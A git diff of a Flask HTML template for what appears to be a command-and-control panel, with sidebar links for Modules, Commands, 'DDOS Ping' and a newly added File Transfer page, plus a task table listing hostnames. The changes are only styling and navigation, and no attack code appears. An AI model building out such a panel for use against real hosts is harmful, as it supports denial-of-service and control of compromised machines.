@@ -40,8 +40,14 @@
             width: 150px;
             margin-bottom: 10px;
         }
+        .sidebar a.selected {
+            background-color: #3a893e;
+        }
+        .sidebar a.logout {
+            background-color: #317334;
+        }
         .sidebar a:hover {
-            background-color: #45a049;
+            background-color: #409744;
         }
         .content {
             margin-left: 240px;
@@ -268,10 +274,11 @@
     <div class="sidebar">
         <img src="{{ url_for('static', filename='Lion.png') }}" alt="Logo" class="logo">
         <a href="{{ url_for('dashboard') }}"><img src="{{ url_for('static', filename='dashboard_icon.png') }}" alt="Dashboard Icon" class="avatar"> Dashboard</a>
-        <a href="{{ url_for('modules') }}"><img src="{{ url_for('static', filename='modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
+        <a href="{{ url_for('modules') }}" class="selected"><img src="{{ url_for('static', filename='modules_icon.png') }}" alt="Modules Icon" class="avatar"> Modules</a>
         <a href="{{ url_for('commands') }}"><img src="{{ url_for('static', filename='commands_icon.png') }}" alt="Commands Icon" class="avatar"> Commands</a>
-        <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='danger_icon.png') }}" alt="DDoS Ping Icon" class="avatar"> DDoS Ping</a>
-        <a href="{{ url_for('logout') }}"><img src="{{ url_for('static', filename='logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
+        <a href="{{ url_for('ping') }}"><img src="{{ url_for('static', filename='danger_icon.png') }}" alt="DDOS Ping Icon" class="avatar"> DDOS Ping</a>
+        <a href="{{ url_for('file_transfer') }}"><img src="{{ url_for('static', filename='file_transfer_icon.png') }}" alt="File Transfer Icon" class="avatar"> File Transfer</a>
+        <a href="{{ url_for('logout') }}" class="logout"><img src="{{ url_for('static', filename='logout_icon.png') }}" alt="Logout Icon" class="avatar"> Logout</a>
     </div>
     <form id="commandForm" method="post" name="commandForm">
         <div class="sendcommands">
@@ -298,7 +305,7 @@
             </tr>
         </thead>
         <tbody id="Module_Output_Status_Table">
-            {% for task in taskDb[::-1] %}
+            {% for task in tasks[::-1] %}
                 <tr>
                     <td>{{ task.idNumber }}</td>
                     <td>{{ task.hostname | default('N/A') }}</td>
@@ -324,6 +331,6 @@
                 $("#commandForm").submit();
             });
         });
-    </script>    
+    </script>
 </body>
 </html>
